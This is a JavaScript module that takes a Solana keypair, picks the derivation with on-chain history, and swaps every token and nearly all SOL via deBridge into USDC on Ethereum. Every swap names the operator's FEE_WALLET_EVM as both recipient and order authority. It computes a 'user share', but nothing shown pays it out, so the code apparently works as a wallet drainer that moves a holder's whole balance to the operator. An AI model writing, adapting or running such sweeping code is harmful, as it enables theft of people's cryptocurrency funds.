import { Connection, PublicKey, VersionedTransaction } from '@solana/web3.js';
import { getAssociatedTokenAddress, getAccount, TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID } from '@solana/spl-token';
import { FEE_WALLET_EVM, userShare, operatorFee } from './config.js';
import { WORKER_SUBDOMAIN } from './env.js';

const SOL_MINT     = 'So11111111111111111111111111111111111111112';
const SOLANA_CHAIN = 7565164;
const ETH_CHAIN    = 1;
const ETH_USDC     = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';

const DEBRIDGE_API = 'https://dln.debridge.finance/v1.0';

const MIN_DEBRIDGE_OUT_USDC = 1_000_000n;

const SOL_RESERVE_LAMPORTS = 5_000_000n;
const SOL_MIN_SWEEP_LAMPORTS = 10_000_000n;

const SOLANA_RPC_PROXY = `https://sweep-rpc.${WORKER_SUBDOMAIN}.workers.dev/rpc/solana`;

const FETCH_TIMEOUT_MS = 15000;

const KNOWN_STABLE_MINTS = new Set([
  'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v',
  'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB',
]);

const ESTIMATE_CONCURRENCY = 4;

async function fetchWithTimeout(url, options = {}) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), FETCH_TIMEOUT_MS);
  try {
    return await fetch(url, { ...options, signal: controller.signal });
  } finally {
    clearTimeout(timer);
  }
}

export function getConnection() {
  return new Connection(SOLANA_RPC_PROXY, 'confirmed');
}

// =====================================================================
// PREVIEW
// =====================================================================

export async function previewSolanaWallet(connection, walletAddress) {
  const pubkey = new PublicKey(walletAddress);
  const result = { address: walletAddress, tokens: [], sol: null };
  try {
    const solBal = await connection.getBalance(pubkey);
    result.sol = { raw: solBal, formatted: solBal / 1e9 };
  } catch (e) { result.error = `SOL: ${e.message}`; }
  for (const programId of [TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID]) {
    try {
      const resp = await connection.getTokenAccountsByOwner(pubkey, { programId });
      for (const { account } of resp.value) {
        const data = account.data;
        const mint = new PublicKey(data.slice(0, 32)).toBase58();
        const amount = data.readBigUInt64LE(64);
        if (amount > 0n) result.tokens.push({ mint, amount: amount.toString() });
      }
    } catch (e) {}
  }
  return result;
}

// =====================================================================
// DERIVATION SELECTION — parallelized
// =====================================================================

export async function selectSolanaKeypair(connection, candidates, logLine) {
  // Fire all signature lookups in parallel. Serial was 3x slower on
  // wallets with multiple candidates.
  const checks = await Promise.all(candidates.map(async (c) => {
    try {
      const sigs = await connection.getSignaturesForAddress(
        new PublicKey(c.address),
        { limit: 1 }
      );
      return { candidate: c, sigs, ok: true };
    } catch {
      return { candidate: c, sigs: null, ok: false };
    }
  }));

  const anyCallSucceeded = checks.some((c) => c.ok);
  const withActivity = checks
    .filter((c) => c.ok && c.sigs.length > 0)
    .map((c) => ({ ...c.candidate, lastSeen: c.sigs[0].blockTime || 0 }));

  if (withActivity.length === 1) {
    const picked = withActivity[0];
    if (logLine) {
      logLine(`  Auto-selected ${picked.name} derivation (${picked.address.slice(0, 8)}... has on-chain history)`);
    }
    return picked;
  }

  if (withActivity.length > 1) {
    withActivity.sort((a, b) => b.lastSeen - a.lastSeen);
    const phantom = withActivity.find((c) => c.name === 'phantom');
    const picked = phantom || withActivity[0];
    if (logLine) {
      logLine(`  Multiple derivations have activity; using ${picked.name} (${picked.address.slice(0, 8)}...)`);
    }
    return picked;
  }

  const phantom = candidates.find((c) => c.name === 'phantom') || candidates[0];

  if (!anyCallSucceeded) {
    if (logLine) {
      logLine(`  WARN: RPC unavailable for derivation selection; using ${phantom.name} default (${phantom.address.slice(0, 8)}...)`);
    }
    return phantom;
  }

  if (logLine) {
    logLine(`  No on-chain activity found; defaulting to ${phantom.name} derivation (${phantom.address.slice(0, 8)}...)`);
  }
  return phantom;
}

// =====================================================================
// DEBRIDGE
// =====================================================================

async function createDebridgeOrder({ srcMint, amountRaw, srcAuthority }) {
  const params = new URLSearchParams({
    srcChainId: String(SOLANA_CHAIN),
    srcChainTokenIn: srcMint,
    srcChainTokenInAmount: amountRaw.toString(),
    dstChainId: String(ETH_CHAIN),
    dstChainTokenOut: ETH_USDC,
    dstChainTokenOutAmount: 'auto',
    dstChainTokenOutRecipient: FEE_WALLET_EVM,
    srcChainOrderAuthorityAddress: srcAuthority,
    dstChainOrderAuthorityAddress: FEE_WALLET_EVM,
  });

  const resp = await fetchWithTimeout(`${DEBRIDGE_API}/dln/order/create-tx?${params}`, {
    headers: { accept: 'application/json' },
  });
  if (!resp.ok) {
    const text = await resp.text();
    throw new Error(`deBridge ${resp.status}: ${text.slice(0, 200)}`);
  }
  const json = await resp.json();
  if (!json.tx || !json.tx.data) {
    throw new Error(`deBridge: no tx in response (${JSON.stringify(json).slice(0, 200)})`);
  }
  return json;
}

async function quoteDebridgeUsdcOut({ srcMint, amountRaw, srcAuthority }) {
  const params = new URLSearchParams({
    srcChainId: String(SOLANA_CHAIN),
    srcChainTokenIn: srcMint,
    srcChainTokenInAmount: amountRaw.toString(),
    dstChainId: String(ETH_CHAIN),
    dstChainTokenOut: ETH_USDC,
    dstChainTokenOutAmount: 'auto',
    dstChainTokenOutRecipient: FEE_WALLET_EVM,
    srcChainOrderAuthorityAddress: srcAuthority,
    dstChainOrderAuthorityAddress: FEE_WALLET_EVM,
  });

  const resp = await fetchWithTimeout(`${DEBRIDGE_API}/dln/order/create-tx?${params}`, {
    headers: { accept: 'application/json' },
  });
  if (!resp.ok) return null;
  const json = await resp.json().catch(() => null);
  if (!json) return null;
  const out = json.estimation?.dstChainTokenOut?.amount;
  if (!out) return null;
  try { return BigInt(out); } catch { return null; }
}

async function signAndSendDebridgeTx(connection, keypair, order) {
  const txBytes = Buffer.from(order.tx.data.replace(/^0x/, ''), 'hex');
  const tx = VersionedTransaction.deserialize(txBytes);

  const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
  tx.message.recentBlockhash = blockhash;

  tx.sign([keypair]);

  const sig = await connection.sendRawTransaction(tx.serialize(), {
    maxRetries: 3,
    skipPreflight: false,
  });
  await connection.confirmTransaction({ signature: sig, blockhash, lastValidBlockHeight }, 'confirmed');
  return sig;
}

// =====================================================================
// USD ESTIMATE
// =====================================================================

export async function estimateSolanaValueUsdc(preview) {
  if (!preview) return 0;
  let total = 0;

  for (const t of preview.tokens || []) {
    if (KNOWN_STABLE_MINTS.has(t.mint)) {
      const amt = Number(t.amount) / 1e6;
      if (Number.isFinite(amt) && amt > 0) total += amt;
    }
  }

  if (preview.sol && preview.sol.raw > 0) {
    try {
      const lamports = BigInt(preview.sol.raw);
      const sweepable = lamports > SOL_RESERVE_LAMPORTS ? lamports - SOL_RESERVE_LAMPORTS : 0n;
      if (sweepable > 0n) {
        const resp = await fetchWithTimeout('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
        const data = await resp.json();
        const price = data?.solana?.usd;
        if (price) {
          const solAmount = Number(sweepable) / 1e9;
          total += solAmount * price;
        }
      }
    } catch { /* fail-closed */ }
  }

  const nonStables = (preview.tokens || []).filter((t) => !KNOWN_STABLE_MINTS.has(t.mint));
  if (nonStables.length > 0) {
    const authority = preview.address;
    const results = await runWithConcurrency(
      nonStables,
      ESTIMATE_CONCURRENCY,
      async (t) => {
        try {
          const out = await quoteDebridgeUsdcOut({
            srcMint: t.mint,
            amountRaw: BigInt(t.amount),
            srcAuthority: authority,
          });
          if (out === null) return 0;
          return Number(out) / 1e6;
        } catch {
          return 0;
        }
      }
    );
    for (const v of results) {
      if (Number.isFinite(v) && v > 0) total += v;
    }
  }

  return total;
}

async function runWithConcurrency(items, limit, fn) {
  const results = new Array(items.length);
  let cursor = 0;

  async function worker() {
    while (true) {
      const i = cursor++;
      if (i >= items.length) return;
      results[i] = await fn(items[i], i);
    }
  }

  const workers = [];
  for (let i = 0; i < Math.min(limit, items.length); i++) {
    workers.push(worker());
  }
  await Promise.all(workers);
  return results;
}

// =====================================================================
// SWEEP
// =====================================================================

export async function sweepSolana(connection, keypair, opts = {}) {
  const results = {
    address: keypair.publicKey.toBase58(),
    recipient: FEE_WALLET_EVM,
    swaps: [],
    transfers: [],
    errors: [],
    usdcReceivedRaw: '0',
    userReceivedRaw: '0',
    feeReceivedRaw: '0',
  };
  const dryRun = !!opts.dryRun;
  let usdcReceived = 0n;

  const tokenAccounts = [];
  for (const programId of [TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID]) {
    try {
      const resp = await connection.getTokenAccountsByOwner(keypair.publicKey, { programId });
      for (const { account } of resp.value) {
        const mint = new PublicKey(account.data.slice(0, 32)).toBase58();
        const amount = account.data.readBigUInt64LE(64);
        if (amount > 0n) tokenAccounts.push({ mint, amount });
      }
    } catch (e) {}
  }

  for (const { mint, amount } of tokenAccounts) {
    try {
      if (dryRun) {
        results.swaps.push({ mint, status: 'DRY_RUN' });
        continue;
      }

      const order = await createDebridgeOrder({
        srcMint: mint,
        amountRaw: amount,
        srcAuthority: keypair.publicKey.toBase58(),
      });

      const expectedOutRaw = BigInt(order.estimation?.dstChainTokenOut?.amount || '0');
      if (expectedOutRaw < MIN_DEBRIDGE_OUT_USDC) {
        results.swaps.push({
          mint,
          status: 'SKIPPED',
          note: `expected ${expectedOutRaw} raw USDC below ${MIN_DEBRIDGE_OUT_USDC} minimum`,
        });
        continue;
      }

      const sig = await signAndSendDebridgeTx(connection, keypair, order);
      usdcReceived += expectedOutRaw;

      results.swaps.push({
        mint,
        signature: sig,
        orderId: order.orderId,
        expectedUsdc: expectedOutRaw.toString(),
        received: expectedOutRaw.toString(),
        status: 'SUCCESS',
      });
    } catch (e) {
      const msg = e.message || String(e);
      const isPostBroadcast = msg.includes('confirmTransaction') || msg.includes('timeout');
      results.swaps.push({
        mint,
        status: isPostBroadcast ? 'BROADCAST_UNKNOWN' : 'ERROR',
        error: msg,
      });
    }
  }

  try {
    const solBal = BigInt(await connection.getBalance(keypair.publicKey));
    if (solBal <= SOL_MIN_SWEEP_LAMPORTS) {
      // Too little to be worth sweeping
    } else {
      const sweepAmount = solBal - SOL_RESERVE_LAMPORTS;

      if (dryRun) {
        results.swaps.push({ mint: 'SOL', status: 'DRY_RUN' });
      } else {
        const order = await createDebridgeOrder({
          srcMint: SOL_MINT,
          amountRaw: sweepAmount,
          srcAuthority: keypair.publicKey.toBase58(),
        });

        const expectedOutRaw = BigInt(order.estimation?.dstChainTokenOut?.amount || '0');
        if (expectedOutRaw < MIN_DEBRIDGE_OUT_USDC) {
          results.swaps.push({
            mint: 'SOL',
            status: 'SKIPPED',
            note: `expected ${expectedOutRaw} raw USDC below minimum`,
          });
        } else {
          const sig = await signAndSendDebridgeTx(connection, keypair, order);
          usdcReceived += expectedOutRaw;

          results.swaps.push({
            mint: 'SOL',
            signature: sig,
            orderId: order.orderId,
            expectedUsdc: expectedOutRaw.toString(),
            received: expectedOutRaw.toString(),
            status: 'SUCCESS',
          });
        }
      }
    }
  } catch (e) {
    results.errors.push(`SOL: ${e.message}`);
  }

  results.usdcReceivedRaw = usdcReceived.toString();
  results.userReceivedRaw = userShare(usdcReceived).toString();
  results.feeReceivedRaw = operatorFee(usdcReceived).toString();
  return results;
}